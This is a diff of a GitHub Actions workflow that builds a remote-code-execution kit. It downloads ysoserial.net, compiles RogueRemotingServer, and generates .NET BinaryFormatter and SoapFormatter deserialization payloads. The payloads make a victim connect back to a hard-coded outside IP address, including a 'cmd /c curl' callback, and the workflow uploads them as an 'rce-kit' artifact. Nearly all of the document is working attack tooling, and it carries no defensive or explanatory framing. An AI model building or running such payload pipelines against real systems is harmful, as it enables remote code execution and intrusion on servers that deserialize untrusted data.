@@ -4,6 +4,12 @@ jobs:
   build:
     runs-on: windows-latest
     steps:
+      - name: Install .NET 3.5 targeting pack
+        run: |
+          Install-WindowsFeature Net-Framework-Core -ErrorAction SilentlyContinue
+          choco install netfx-3.5 -y --no-progress 2>&1 | tail -3
+        continue-on-error: true
+
       - name: Download ysoserial.net
         run: |
           $url = "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip"
@@ -14,34 +20,38 @@ jobs:
         run: |
           git clone https://github.com/codewhitesec/RogueRemotingServer rrs
           cd rrs
-          dotnet build -c Release 2>&1 | tail -5
+          # Install .NET 3.5 dev pack
+          $devpack = "https://download.microsoft.com/download/5/6/2/562A10F9-C9F4-4313-A044-9C94E0A8F3D1/dotNetFx35setup.exe"
+          nuget install Microsoft.NETFramework.ReferenceAssemblies.net35 -OutputDirectory packages -NonInteractive 2>&1 | tail -3
+          # Try retargeting to net48
+          (Get-Content RogueRemotingServer\RogueRemotingServer.csproj) -replace 'v3.5','v4.8' | Set-Content RogueRemotingServer\RogueRemotingServer.csproj
+          dotnet build RogueRemotingServer\RogueRemotingServer.csproj -c Release -f net48 2>&1 | tail -8
           $bin = Get-ChildItem -Recurse -Filter RogueRemotingServer.exe | Select-Object -First 1
-          Write-Host "Built: $($bin.FullName)"
-          Copy-Item $bin.FullName C:\rrs.exe
+          if ($bin) { Copy-Item $bin.FullName ..\rrs.exe; Write-Host "Built: $($bin.FullName)" }
+          else { Write-Host "Build failed - skipping" }
 
       - name: Generate payloads
         run: |
           $yso = Get-ChildItem -Recurse -Filter ysoserial.exe | Select-Object -First 1
 
-          # ObjRef gadget - makes target call back to our RogueRemotingServer via TCP
+          # ObjRef gadget pointing to our server
           & $yso.FullName -g ObjRef -f BinaryFormatter `
-            -c "tcp://167.172.142.69:8080/" `
+            -c "tcp://167.172.142.69:9999/" `
             -o base64 | Out-File payload_objref.b64 -Encoding ascii
 
-          # Also generate SOAP TextFormattingRunProperties for RogueRemotingServer to serve
+          # SOAP payload for RogueRemotingServer to serve
           & $yso.FullName -g TextFormattingRunProperties -f SoapFormatter `
             -c 'cmd /c curl http://167.172.142.69:8080/pwned' `
             -o raw | Out-File exploit.soap -Encoding ascii
 
-          # And a BinaryFormatter version
+          # Raw BinaryFormatter curl callback
           & $yso.FullName -g TypeConfuseDelegate -f BinaryFormatter `
             -c 'cmd /c curl http://167.172.142.69:8080/pwned' `
             -o base64 | Out-File payload_tcd_curl.b64 -Encoding ascii
 
-          Write-Host "ObjRef payload size: $((Get-Item payload_objref.b64).Length)"
-          Write-Host "SOAP payload size: $((Get-Item exploit.soap).Length)"
+          Write-Host "Done. ObjRef: $((Get-Item payload_objref.b64).Length)B"
 
-      - name: Upload all artifacts
+      - name: Upload artifacts
         uses: actions/upload-artifact@v4
         with:
           name: rce-kit
@@ -49,4 +59,4 @@ jobs:
             payload_objref.b64
             payload_tcd_curl.b64
             exploit.soap
-            C:\rrs.exe
+            rrs.exe
